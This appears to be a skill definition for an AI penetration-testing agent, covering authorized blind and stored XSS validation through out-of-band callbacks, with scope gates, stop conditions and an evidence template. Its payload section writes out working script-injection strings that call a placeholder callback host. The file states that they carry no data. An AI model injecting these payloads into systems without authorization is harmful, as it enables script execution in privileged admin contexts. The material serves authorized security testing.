---
name: vuln-blind-xss
description: Blind/Stored XSS validation via OOB callback — detect admin-panel, log-viewer, and background-context script execution with minimal proof signals and strict data-minimization gates.
disable-model-invocation: true
risk: safe-active
allowed-modes: [auto, bug-bounty, red-team, ctf, blue-team, offensive, grey-hat, forensic, reverse-engineering, mobile-pentest]
authorization-required: yes
evidence-outputs: [command-log, redacted-evidence, finding-draft]
---

# Blind XSS — out-of-band execution validation

Use this skill to validate Blind/Stored XSS where payloads execute in unobserved contexts: admin panels, log viewers, moderation queues, support-ticket readers, or internal dashboards. Detection relies on OOB callback infrastructure, not immediate browser reflection. Every test must be scoped, authorized, and limited to proof-grade payloads with zero data collection beyond a minimal callback signal.

## Required inputs

- Written scope naming the target application, authorized injection surfaces (form fields, headers, file metadata, URL paths), approved test accounts, and explicit permission for Blind XSS payload delivery.
- OOB callback infrastructure under tester control: interactsh-client instance, self-hosted listener, or project-approved callback service with unique per-engagement CANARY domain.
- Valid authorization cache for the target. Separate permission required for cookie capture, session hijack proof, or admin-panel access — these are outside default Blind XSS scope.
- Known rate limits, WAF posture, lockout thresholds, testing window, and detection contact.
- List of injection surfaces mapped during recon: contact forms, user profile fields, comment/message bodies, support ticket inputs, product review fields, file upload filenames, HTTP headers likely logged to admin consoles (User-Agent, Referer, X-Forwarded-For), URL path segments, error-message inputs, invoice/order notes, API client name/description fields.

## Required gates

1. `pentest_agent_load_config` → `pentest_agent_validate_policy`.
2. `pentest_agent_parse_scope` → `pentest_agent_validate_target`.
3. `pentest_agent_check_authorization` before any payload delivery.
4. `pentest_agent_build_command` for dry-run argv preview when catalog tools are useful.
5. `pentest_agent_execute_tool` for execution — never raw shell.
6. `pentest_agent_append_evidence` → `pentest_agent_record_finding` → report.

## Workflow

### Phase 1 — callback infrastructure

Bring up an OOB listener and verify it receives callbacks before injecting any payload:
1. Start interactsh-client or equivalent with a unique per-engagement session.
2. Record the CANARY domain assigned.
3. Send a test HTTP/DNS callback from a separate machine or network path to confirm reachability.
4. Verify the listener displays the test callback with timestamp and remote address.
5. Keep the listener running for the entire testing window — Blind XSS callbacks may arrive hours or days after injection.

### Phase 2 — injection surface selection

Prioritize surfaces where payloads are known or likely to be viewed by a privileged user:
- Contact/support forms → viewed by admin or support staff.
- User profile fields (display name, bio, signature) → viewed in admin user-management panels.
- Comment/moderation fields → viewed in moderation queues.
- File upload filenames and metadata (EXIF title, author, comment) → viewed in admin file browsers.
- HTTP headers: User-Agent, Referer, X-Forwarded-For → viewed in admin traffic logs or analytics dashboards.
- URL path injection: `GET /page/<payload>` → logged in server error logs viewed by admins.
- Order/invoice notes → viewed by order-management staff.

Focus on one surface class at a time. Record which surface, which field, and which payload variant was used for each injection attempt.

### Phase 3 — minimal-proof payload construction

Use payloads that produce a single callback carrying only a source identifier — no cookies, no DOM content, no page URL:

```text
CANARY = <engagement-specific OOB domain>

Minimal payload variants (choose based on injection context):
HTML attribute:  "><script src=https://CANARY/bxss></script>
JavaScript value: ';new Image().src='https://CANARY/js';//
URL context:     javascript:fetch('https://CANARY/url')
JSON value:      <script src=https://CANARY/json></script>
Header injection: <script src=https://CANARY/hdr></script>
File name:       <script src=https://CANARY/file>.jpg
```

Rules:
- Each payload carries a unique source label (`/bxss`, `/js`, `/url`, `/json`, `/hdr`, `/file`) so callback origin is unambiguous.
- Never include `document.cookie`, `document.domain`, `document.location`, `innerHTML`, or any page content in the callback.
- Never use payloads that exfiltrate data — the callback URL alone is sufficient proof.
- Avoid payloads that modify page appearance (visible alert, redirect, DOM rewrite) unless already confirmed and scope allows.

### Phase 4 — delivery and tracking

For each injection surface:
1. Deliver one payload variant.
2. Log the injection timestamp, surface identifier, payload label, and any request ID or response metadata.
3. Wait for the callback window: active monitoring for the first hour, then periodic checks up to 72 hours.
4. If a callback arrives, record: protocol (http/dns), remote address, full callback ID, timestamp, and which source label matched.
5. Correlate callback timestamp with injection timestamp to estimate the review delay.

### Phase 5 — callback triage and false-positive elimination

When a callback arrives:
1. Verify the remote address is not your own test infrastructure.
2. Verify the callback ID prefix matches the expected source label.
3. Rule out crawlers, security scanners, or email link previews by checking the User-Agent in the HTTP callback.
4. If DNS callback: verify the resolved IP is the target's infrastructure, not a recursive DNS server.
5. Only one clean callback per surface is needed for a confirmed finding. Do not continue injecting more payloads once proof is obtained.

## Decision points

- **Stop at first confirmed callback**: one clean OOB callback with correct source label on target infrastructure is sufficient proof. Do not escalate payloads.
- **Downgrade to negative result**: if no callback arrives within the testing window (72h default), document the surfaces tested, payloads delivered, and absence of callback. This is a valid negative finding.
- **Escalate on admin-context callback**: if the callback's remote address resolves to the target's internal/admin IP range, the impact is higher — the payload executed in a privileged context.
- **Refuse data-collection escalation**: if a stakeholder asks to deploy cookie-stealing or page-content-exfiltrating payloads, refuse unless scope and authorization are amended to explicitly permit data capture, and maintainer approval is obtained.

## Prohibited behavior

- Payloads that collect cookies, session tokens, page content, DOM state, form data, or any user/application data.
- Payloads that modify the page: redirects, DOM rewrites, visible alerts, keyloggers, or form hijacking.
- Payloads that persist beyond the testing window (service workers, localStorage, IndexedDB).
- Injecting into production user accounts, real customer data fields, or live transaction records.
- Using third-party callback services that log or retain callback data outside tester control.
- Delivering payloads to surfaces not explicitly listed in the scope file.

## Stop conditions

- First confirmed clean callback → finding confirmed, stop injecting.
- Callback reveals admin/internal IP origin → critical finding, stop injecting, document impact.
- Callback carries unexpected data (cookie, token, page URL) → redact, stop, investigate surface.
- Testing window expires with no callbacks → negative result, document and stop.
- WAF blocks, rate limiting, account lockout, or detection-team contact.

## Evidence — callback record

For each tested surface, record:

```text
Surface: <contact form | user-agent header | file name | ...>
Injection timestamp: <ISO 8601>
Payload label: <bxss | js | url | json | hdr | file>
CANARY domain: <engagement-specific OOB domain>
Callback received: <yes | no>
Callback timestamp: <ISO 8601 if received>
Callback protocol: <http | dns>
Remote address: <redacted IP or range>
Source label match: <yes | no | partial>
False-positive check: <clean | crawler | scanner | email-preview>
Impact: <none | blind xss confirmed | admin context confirmed>
Confidence: <confirmed | likely | needs-review>
```

Aggregate into a Blind XSS surface matrix. Include all tested surfaces, whether callback was received, and false-positive disposition. Never store: callback URLs containing cookies or tokens, raw HTTP callback bodies, or the full CANARY domain if it reveals tester infrastructure.

## Report handoff

When a finding is confirmed:
1. `pentest_agent_record_finding` with affected surface, injection vector, callback proof summary, CVSS estimate (6.1–7.5 depending on admin context), and remediation guidance.
2. Reference the callback record matrix.
3. Recommend: output encoding on all injected fields, Content-Security-Policy with strict `script-src`, HttpOnly cookies, and periodic Blind XSS regression tests with OOB callback monitoring.
